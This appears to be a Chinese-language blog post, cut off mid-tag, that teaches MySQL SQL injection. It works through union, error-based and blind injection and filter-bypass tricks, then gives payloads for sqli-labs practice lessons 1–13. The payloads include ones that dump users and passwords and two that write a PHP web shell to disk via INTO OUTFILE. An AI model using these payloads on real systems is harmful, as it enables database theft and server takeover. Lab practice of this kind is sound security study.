    <published>2018-11-02T02:23:07.000Z</published>
    <updated>2019-05-16T04:01:30.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><h3 id="MySQL-常用语句备忘"><a href="#MySQL-常用语句备忘" class="headerlink" title="MySQL 常用语句备忘"></a>MySQL 常用语句备忘</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Default Databases</span></span><br><span class="line">mysqlRequires root privileges</span><br><span class="line">information_schemaAvailable from version 5 and higher</span><br><span class="line"></span><br><span class="line"><span class="keyword">Comment</span> <span class="keyword">Out</span> <span class="keyword">Query</span></span><br><span class="line"><span class="comment"># /**/ -- - ;%00 `</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();<span class="comment">-- 数据库用户名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();<span class="comment">-- MySQL版本</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();<span class="comment">-- 数据库名</span></span><br><span class="line"><span class="keyword">select</span> @@basedir;<span class="comment">-- 数据库安装路径</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;<span class="comment">-- 数据存储路径</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os;    <span class="comment">-- 操作系统版本</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;<span class="comment">-- </span></span><br><span class="line">if(expr,v1,v2)<span class="comment">-- expr正确则v1，否则v2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> expr <span class="keyword">then</span> v1 <span class="keyword">else</span> v2 <span class="keyword">end</span>;  <span class="comment">-- 与 if 功能相同</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">'11'</span>, <span class="string">'22'</span>, <span class="string">'33'</span>);<span class="comment">-- 字符串连接 112233</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(x, s1,s2...sn)<span class="comment">-- 以 x 作为连接符，将字符串连接</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>()<span class="comment">-- 把查询出来的多行连接起来</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">str</span>, <span class="keyword">start</span>, <span class="keyword">count</span>)<span class="comment">-- 从start开始截取count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(), <span class="number">1</span>, <span class="number">1</span>)<span class="comment">-- 与mid同</span></span><br><span class="line"><span class="comment"># 如果用不了逗号，直接 from start for count</span></span><br><span class="line"><span class="comment"># union select * from (select 1)a join (select 2)b == union select 1,2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">str</span>, <span class="keyword">count</span>)<span class="comment">-- 截取左边count个字符</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ord</span>()<span class="comment">-- 返回第一个字符的ASCII码</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>()<span class="comment">-- 与ord同</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">32</span>, <span class="number">58</span>, <span class="number">32</span>)<span class="comment">-- ' : ' 即空格+ : +空格</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">database</span>());</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;<span class="comment">-- 不加限制条件将删除整张表</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> ds_name;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">column</span> column_name;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name;</span><br><span class="line"><span class="keyword">update</span> table_name <span class="keyword">set</span> column_name=<span class="string">'new'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;  <span class="comment">-- 更新</span></span><br><span class="line"><span class="comment">/*!50000select*/</span></span><br><span class="line">where id = 0.1 union <span class="keyword">select</span> ...</span><br><span class="line"><span class="keyword">xor</span>, ||, &amp;&amp;, !, <span class="keyword">not</span>，&lt;&gt;</span><br></pre></td></tr></table></figure><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><h5 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h5><p>所查询的字段数需与主查询一致</p><p>字段数可先用 order by x 来确定</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><h5 id="information-schema-注入"><a href="#information-schema-注入" class="headerlink" title="information_schema 注入"></a>information_schema 注入</h5><p>存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x7365637265745f666c6167</span>; <span class="comment">-- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#  -- 获取表中的字段名</span></span><br></pre></td></tr></table></figure><h5 id="函数报错信息注入"><a href="#函数报错信息注入" class="headerlink" title="函数报错信息注入"></a>函数报错信息注入</h5><blockquote><p> 前提：后台没有屏蔽数据库报错信息，在语法发生错误时会输出到前端</p></blockquote><p>常用报错函数：updatexml(), extractvalue(), floor() <a href="https://blog.csdn.net/whatday/article/details/63683187" target="_blank" rel="noopener">十种MySQL报错注入</a>  <a href="http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">【SQL注入】报错注入姿势总结</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));%23</span><br><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);%23</span><br></pre></td></tr></table></figure><p>基于函数报错信息获取（select, insert, update, delete)</p><h5 id="insert-update-delete-注入"><a href="#insert-update-delete-注入" class="headerlink" title="insert / update / delete 注入"></a>insert / update / delete 注入</h5><p>结合函数报错信息，将函数插入到语句中</p><h5 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h5><p>如 <code>XFF</code>，<code>referer</code></p><p>观察点：后台收集了请求头中的信息，并存入到数据库中</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>结合 and 进行逻辑判断</p><p>效率太低，写脚本爆</p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>无显示回显，可在以前的基础上加入 <code>sleep()</code> 语句，若明显延迟，则注入成功</p><p><code>BENCHMARK(count,expr)</code>  执行 <code>count</code> 次的 <code>expr</code>，如 BENCHMARK(10000000,SHA(‘1’))</p><p>即使 <code>sleep</code> 和 <code>benchmark</code> 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，</p><p>以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) </span><br><span class="line"><span class="keyword">from</span> information_schema.columns A, </span><br><span class="line">information_schema.columns B, </span><br><span class="line">information_schema.columns C<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>还有 <code>get_lock()</code></p><h5 id="利用注入写入后门"><a href="#利用注入写入后门" class="headerlink" title="利用注入写入后门"></a>利用注入写入后门</h5><p>前提：开启 secure_file_priv，并且具有写的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php system($_GET[1])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'H:\\a.php'</span><span class="comment">--%20</span></span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>检测被过滤的关键词：</p><ul><li><p>fuzz 一波 ASCII 码</p></li><li><p>id = 1 ^ (length(‘xxx’)=3)</p></li></ul><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ul><li><p>使用注释绕过，/*<em>/ (/\</em>1*/)</p></li><li><p>使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))</span><br><span class="line"><span class="keyword">from</span>(information_schema.tables)</span><br><span class="line"><span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br></pre></td></tr></table></figure><ul><li>使用符号替代空格 </li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span> 空格</span><br><span class="line">%<span class="number">09</span>TAB 键（水平）</span><br><span class="line">%<span class="number">0</span>bTAB 键（垂直）</span><br><span class="line">%<span class="number">0</span>dreturn 功能</span><br><span class="line">%<span class="number">0</span>c新的一页</span><br><span class="line">%a0空格</span><br><span class="line">%<span class="number">0</span>a新建一行</span><br><span class="line"></span><br><span class="line">SQLite3 <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">MySQL5 <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D A0 <span class="number">20</span> </span><br><span class="line">PosgresSQL <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">Oracle <span class="number">11</span>g <span class="number">00</span> <span class="number">0</span>A <span class="number">0</span>D <span class="number">0</span>C <span class="number">09</span> <span class="number">20</span> </span><br><span class="line">MSSQL <span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span></span><br></pre></td></tr></table></figure><h4 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="string">"users"</span></span><br></pre></td></tr></table></figure><p>如果引号被过滤了，那么上面的<code>where</code>子句就失效了，此时可以使用<strong>十六进制</strong>。<br><code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name  <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=<span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><p><strong>宽字节绕过</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>bf<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>df<span class="meta">%</span><span class="number">27</span> <span class="meta">%</span>aa<span class="meta">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><p><code>substr(), mid()</code> 里的逗号可用 <code>from for</code> 代替</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">mid</span>(<span class="keyword">database</span>(<span class="number">0</span> <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>对于 <code>limit</code> 里面的逗号可以使用 <code>offset</code> 绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>  </span><br><span class="line">&lt;=&gt;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="比较符"><a href="#比较符" class="headerlink" title="比较符"></a>比较符</h4><p>大于、小于可用 <code>greatest(), least()</code> 代替，还可以 <code>between and</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">greatest</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure><h4 id="条件连接词"><a href="#条件连接词" class="headerlink" title="条件连接词"></a>条件连接词</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用符号:</span><br><span class="line"><span class="keyword">and</span> =&gt; &amp;&amp;</span><br><span class="line"><span class="keyword">or</span> =&gt; ||</span><br><span class="line"><span class="keyword">xor</span> =&gt; |</span><br><span class="line">not =&gt; !</span><br><span class="line"></span><br><span class="line">大小写变形: <span class="keyword">Or</span>, <span class="keyword">OR</span>, <span class="keyword">oR</span></span><br><span class="line">添加注释: o<span class="comment">/**/</span>r</span><br><span class="line">编码：hex, urlencode</span><br></pre></td></tr></table></figure><h4 id="union-select-where"><a href="#union-select-where" class="headerlink" title="union, select, where"></a>union, select, where</h4><p>（1）使用注释符绕过：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//，-- , /**/, #, --+, -- -, ;,%00,--a</span></span><br><span class="line"><span class="keyword">U</span><span class="comment">/**/</span> NION <span class="comment">/**/</span> <span class="keyword">SE</span><span class="comment">/**/</span> LECT <span class="comment">/**/</span>user，<span class="keyword">pwd</span> from user</span><br><span class="line"></span><br><span class="line">sele%<span class="keyword">ct</span> <span class="keyword">IIS</span> 服务器可以插入 %</span><br></pre></td></tr></table></figure><p>（2）使用大小写绕过：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'<span class="built_in">UnIoN</span><span class="comment">/**/</span><span class="built_in">SeLeCT</span></span><br></pre></td></tr></table></figure><p>（3）内联注释绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1'<span class="comment">/*!UnIoN*/</span> <span class="keyword">SeLeCT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">concat</span>(<span class="comment">/*!table_name*/</span>) <span class="keyword">FrOM</span> <span class="comment">/*information_schema*/</span>.tables <span class="comment">/*!WHERE */</span><span class="comment">/*!TaBlE_ScHeMa*/</span> <span class="keyword">like</span> <span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>（4） 双关键字绕过：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>'UNIunionONSeLselectECT1,<span class="number">2</span>,<span class="number">3</span>–-</span><br></pre></td></tr></table></figure><p>（5）科学计数法</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id</span>=<span class="number">0</span>e1union</span><br></pre></td></tr></table></figure><h4 id="表名等关键词"><a href="#表名等关键词" class="headerlink" title="表名等关键词"></a>表名等关键词</h4><p>以information_schema.tables为例</p><p>空格 <code>information_schema . tables</code></p><p>着重号 <code>information&lt;/em&gt;schema.tables</code></p><p>特殊符 <code>/!informationschema.tables/</code></p><p>别名 <code>information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)</code></p><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>常用注释符：<code>#, --+, /**/</code>，可以用 <code>;%00</code> 代替</p><p>不用注释符，与后面的语句构造闭合就行，如 <code>||&#39;1</code>，恰好与 <code>’ LIMIT 0,1</code> 闭合</p><h4 id="等号"><a href="#等号" class="headerlink" title="等号"></a>等号</h4><p>使用 <code>like 、rlike 、regexp</code> 或者  <code>&lt; , &gt;</code></p><h3 id="部署练习平台"><a href="#部署练习平台" class="headerlink" title="部署练习平台"></a>部署练习平台</h3><ul><li>手工搭建法</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Audi-1/sqli-labs.git</span><br><span class="line"></span><br><span class="line">修改 sql-connections/sql-labs/db-creds.inc 中 MySQL用户名/密码</span><br><span class="line">再放到 Apache 下或者 PHPstudy 这种集成工具</span><br><span class="line"></span><br><span class="line">From your browser access the sql-labs folder to load index.html</span><br><span class="line">Click on the link setup/resetDB to create database, create tables and populate Data.</span><br><span class="line">Labs ready to be used, click on lesson number to open the lesson page.</span><br><span class="line">Enjoy the labs</span><br></pre></td></tr></table></figure><ul><li>简单粗暴法</li></ul><p><a href="https://www.jianshu.com/p/2ad3edf3c61f" target="_blank" rel="noopener">docker配置sqli-labs</a></p><h2 id="开始闯关"><a href="#开始闯关" class="headerlink" title="开始闯关"></a>开始闯关</h2><h3 id="题目类型"><a href="#题目类型" class="headerlink" title="题目类型"></a>题目类型</h3><ul><li><p>基于从服务器接收到的响应</p><ul><li>基于错误的SQL注入</li><li>联合查询的类型</li><li>堆查询注入</li><li>SQL盲注<ul><li>基于布尔SQL盲注</li><li>基于时间的SQL盲注</li><li>基于报错的SQL盲注</li></ul></li></ul></li><li><p>基于如何处理输入的SQL查询（数据类型）</p><ul><li>基于字符串</li><li>数字或整数为基础的</li></ul></li><li><p>基于程度和顺序的注入(哪里发生了影响)</p><ul><li><p>一次注入</p><p>输入的注入语句对WEB直接产生了影响，出现了结果</p></li><li><p>二次注入</p><p>类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，</p><p>通过其它的辅助间接的对WEB产生危害，这样的就被称为是二次注入</p></li></ul></li><li><p>基于注入点的位置上的</p><ul><li>通过用户输入的表单域的注入</li><li>通过cookie注入</li><li>通过服务器变量注入（基于头部信息的注入）</li></ul></li></ul><h3 id="Less-1-Error-based-Single-quotes"><a href="#Less-1-Error-based-Single-quotes" class="headerlink" title="Less-1 Error based - Single quotes"></a>Less-1 Error based - Single quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="Less-2-Error-based-Double-quotes"><a href="#Less-2-Error-based-Double-quotes" class="headerlink" title="Less-2 Error based - Double quotes"></a>Less-2 Error based - Double quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="Less-3-Error-based-Single-quotes-with-twist"><a href="#Less-3-Error-based-Single-quotes-with-twist" class="headerlink" title="Less-3 Error based - Single quotes with twist"></a>Less-3 Error based - Single quotes with twist</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1') union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="Less-4-Error-based-Double-Quotes"><a href="#Less-4-Error-based-Double-Quotes" class="headerlink" title="Less-4 Error based - Double Quotes"></a>Less-4 Error based - Double Quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1") union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="Less-5-Double-Injection-Single-Quotes"><a href="#Less-5-Double-Injection-Single-Quotes" class="headerlink" title="Less-5 Double Injection - Single Quotes"></a>Less-5 Double Injection - Single Quotes</h3><p>二次注入有点懵逼，直接注入没有任何回显，函数报错盲注搞起</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure><h3 id="Less-6-Double-Injection-Double-Quotes"><a href="#Less-6-Double-Injection-Double-Quotes" class="headerlink" title="Less-6 Double Injection - Double Quotes"></a>Less-6 Double Injection - Double Quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure><h3 id="Less-7-Dump-into-outfile"><a href="#Less-7-Dump-into-outfile" class="headerlink" title="Less-7 Dump into outfile"></a>Less-7 Dump into outfile</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST[1])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\a.php'</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-8-Blind-Boolean-Based-Single-Quotes"><a href="#Less-8-Blind-Boolean-Based-Single-Quotes" class="headerlink" title="Less-8 Blind - Boolean Based - Single Quotes"></a>Less-8 Blind - Boolean Based - Single Quotes</h3><p>没有任何报错信息，无法直接根据报错注入，时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1' and if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>, <span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>))=<span class="number">68</span> ,<span class="number">1</span> , <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="Less-9、Less-10-这两个与-8-类似"><a href="#Less-9、Less-10-这两个与-8-类似" class="headerlink" title="Less-9、Less-10 这两个与 8 类似"></a>Less-9、Less-10 这两个与 8 类似</h3><h3 id="Less-11-Error-Based-Single-quotes"><a href="#Less-11-Error-Based-Single-quotes" class="headerlink" title="Less-11 Error Based - Single quotes"></a>Less-11 Error Based - Single quotes</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1' union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1") union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>发现有报错信息，尝试报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1') and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>双引号</p><figure class="highlight 